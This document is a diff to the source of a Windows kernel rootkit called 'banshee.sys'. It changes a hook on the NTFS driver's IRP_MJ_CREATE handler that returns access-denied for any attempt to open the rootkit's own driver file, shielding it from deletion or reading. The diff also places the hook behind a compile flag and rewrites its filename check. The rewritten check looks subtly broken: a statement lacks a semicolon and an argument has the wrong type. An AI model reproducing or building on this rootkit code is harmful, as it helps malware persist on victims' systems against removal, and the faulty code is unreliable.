@@ -40,7 +40,6 @@ BeGetFilenameFromPath(PWCH fullPath)
     }
 }
 
-
 /**
  * Retrieves the driver object of the NTFS driver.
  *
@@ -66,6 +65,7 @@ BeGetNtfsDriverObject(OUT PDRIVER_OBJECT* ntfsDriverObject)
     return STATUS_SUCCESS;
 }
 
+#if DENY_DRIVER_FILE_ACCESS
 /**
  * Hooked IRP_MJ_CREATE handler for the NTFS driver.
  * Denies access to the file if the filename matches the rootkit driver filename "banshee.sys",
@@ -85,8 +85,9 @@ BeHooked_NTFS_IRP_MJ_CREATE(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 
     // If the file that will be accessed is our rootkit driver, deny access to the file
     // This doesnt hide the file, but protects it from deletion or read access
+    UNICODE_STRING driverName = RTL_CONSTANT_STRING(L"banshee.sys")
     if (!BeIsStringNull(fullPath) &&
-        (_strcmpi_w(L"banshee.sys", BeGetFilenameFromPath(fullPath)) == 0))
+        (RtlCompareUnicodeString(BeGetFilenameFromPath(fullPath), &driverName, TRUE) == 0))
     {
         LOG_MSG("Filename: %ws\n", fullPath);
         Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
@@ -145,3 +146,4 @@ BeUnhookNTFSFileCreate()
     ObDereferenceObject(ntfsDriverObject);
     return STATUS_SUCCESS;
 }
+#endif 
